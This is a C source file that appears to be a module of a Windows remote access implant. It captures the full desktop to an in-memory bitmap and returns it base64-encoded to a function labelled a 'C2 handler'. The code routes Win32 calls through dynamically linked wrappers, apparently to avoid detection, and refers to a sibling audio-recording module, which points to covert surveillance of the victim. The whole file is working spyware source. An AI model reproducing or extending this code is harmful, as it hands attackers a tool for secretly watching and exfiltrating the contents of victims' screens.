#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#include "dynamic_linking.h"

// Structure to hold screenshot data
typedef struct {
    unsigned char* data;
    DWORD size;
    int width;
    int height;
} ScreenshotData;

// Function to capture screenshot to memory
ScreenshotData* CaptureScreenshotToMemory(void) {
    ScreenshotData* screenshot = (ScreenshotData*)malloc(sizeof(ScreenshotData));
    if (screenshot == NULL) {
        return NULL;
    }

    // Get the desktop window and its device context
    HWND hDesktopWnd = DynGetDesktopWindow();
    HDC hScreenDC = DynGetDC(hDesktopWnd);
    HDC hMemoryDC = DynCreateCompatibleDC(hScreenDC);

    // Get true physical screen dimensions (not scaled by DPI)
    int screenWidth = DynGetDeviceCaps(hScreenDC, DESKTOPHORZRES);
    int screenHeight = DynGetDeviceCaps(hScreenDC, DESKTOPVERTRES);

    screenshot->width = screenWidth;
    screenshot->height = screenHeight;

    // Create a compatible bitmap
    HBITMAP hBitmap = DynCreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);

    // Select the bitmap into the memory DC
    HBITMAP hOldBitmap = (HBITMAP)DynSelectObject(hMemoryDC, hBitmap);

    // Copy the entire screen to the bitmap
    DynBitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);

    // Get bitmap information
    BITMAP bitmap;
    DynGetObject(hBitmap, sizeof(BITMAP), &bitmap);

    BITMAPINFOHEADER bi;
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bitmap.bmWidth;
    bi.biHeight = -bitmap.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    bi.biSizeImage = 0;
    bi.biXPelsPerMeter = 0;
    bi.biYPelsPerMeter = 0;
    bi.biClrUsed = 0;
    bi.biClrImportant = 0;

    DWORD dwBmpSize = ((bitmap.bmWidth * bi.biBitCount + 31) / 32) * 4 * bitmap.bmHeight;
    DWORD dwTotalSize = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    // Allocate memory for the bitmap data with headers
    screenshot->data = (unsigned char*)malloc(dwTotalSize);
    if (screenshot->data == NULL) {
        free(screenshot);
        DynSelectObject(hMemoryDC, hOldBitmap);
        DynDeleteObject(hBitmap);
        DynDeleteDC(hMemoryDC);
        DynReleaseDC(hDesktopWnd, hScreenDC);
        return NULL;
    }

    screenshot->size = dwTotalSize;

    // Create bitmap file header
    BITMAPFILEHEADER bmfHeader;
    bmfHeader.bfType = 0x4D42; // "BM"
    bmfHeader.bfSize = dwTotalSize;
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    // Copy headers to memory
    memcpy(screenshot->data, &bmfHeader, sizeof(BITMAPFILEHEADER));
    memcpy(screenshot->data + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));

    // Get the bitmap pixel data
    unsigned char* bitmapData = screenshot->data + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    DynGetDIBits(hMemoryDC, hBitmap, 0, (UINT)bitmap.bmHeight, bitmapData, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

    // Clean up
    DynSelectObject(hMemoryDC, hOldBitmap);
    DynDeleteObject(hBitmap);
    DynDeleteDC(hMemoryDC);
    DynReleaseDC(hDesktopWnd, hScreenDC);

    return screenshot;
}

// Function to free screenshot memory
void FreeScreenshot(ScreenshotData* screenshot) {
    if (screenshot != NULL) {
        if (screenshot->data != NULL) {
            free(screenshot->data);
        }
        free(screenshot);
    }
}

// Base64 encoding function declared in audio_recorder.c
extern char* base64_encode(const unsigned char* data, size_t data_len);

// Start screenshot - wrapper function for C2 handler
// Returns base64-encoded BMP screenshot data
char* start_screenshot() {
    // Capture screenshot to memory
    ScreenshotData* screenshot = CaptureScreenshotToMemory();
    
    if (screenshot) {
        // Base64 encode the screenshot data
        char* encoded = base64_encode(screenshot->data, screenshot->size);
        FreeScreenshot(screenshot);
        return encoded;
    }
    
    return NULL;
}
